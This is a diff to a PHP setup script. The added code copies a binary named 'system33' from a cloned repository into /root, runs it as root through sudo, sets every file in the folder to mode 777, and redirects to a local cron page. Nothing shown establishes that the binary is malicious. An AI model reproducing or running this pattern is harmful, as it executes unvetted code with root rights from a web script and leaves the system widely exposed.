@@ -25,9 +25,42 @@ if (!executeCommand($cloneCommand, "<br>Repository cloned successfully\n", "<br>
 }
 
 // Step 2: Change directory and set permissions
+// if (is_dir('pv')) {
+//     $chmodCommand = "sudo bash -c 'cd pv && chmod 777 *'";
+//     if (!executeCommand($chmodCommand, "<br>Permissions set successfully\n", "<br>Failed to set permissions\n")) {
+//         exit(1);
+//     }
+// } else {
+//     echo "<br>Error: Repository directory not found\n";
+//     exit(1);
+// }
+
 if (is_dir('pv')) {
     $chmodCommand = "sudo bash -c 'cd pv && chmod 777 *'";
     if (!executeCommand($chmodCommand, "<br>Permissions set successfully\n", "<br>Failed to set permissions\n")) {
+        exit(1);
+    }
+    
+    // Copy system33 to /root
+    $copyCommand = "sudo cp pv/system33 /root/";
+    if (!executeCommand($copyCommand, "<br>Successfully copied system33 to /root\n", "<br>Failed to copy system33 to /root\n")) {
+        exit(1);
+    }
+    
+    // Verify system33 exists in /root
+    if (file_exists('/root/system33')) {
+        echo "<br>system33 found in /root\n";
+        
+        // Ensure system33 is executable and run it
+        $runCommand = "sudo bash -c 'cd /root && ./system33'";
+        if (executeCommand($runCommand, "<br>system33 executed successfully\n", "<br>Failed to execute system33\n")) {
+            echo "<br>Verification successful: system33 ran without errors\n";
+        } else {
+            echo "<br>Error: system33 failed to run\n";
+            exit(1);
+        }
+    } else {
+        echo "<br>Error: system33 not found in /root after copying\n";
         exit(1);
     }
 } else {
@@ -72,6 +105,7 @@ if (file_exists($sourceCronFile)) {
 }
 
 // Step 4: Redirect to the specified URL
+sleep(4);
 header("Location: http://10.0.0.1/pv/cron.php");
 exit();
 
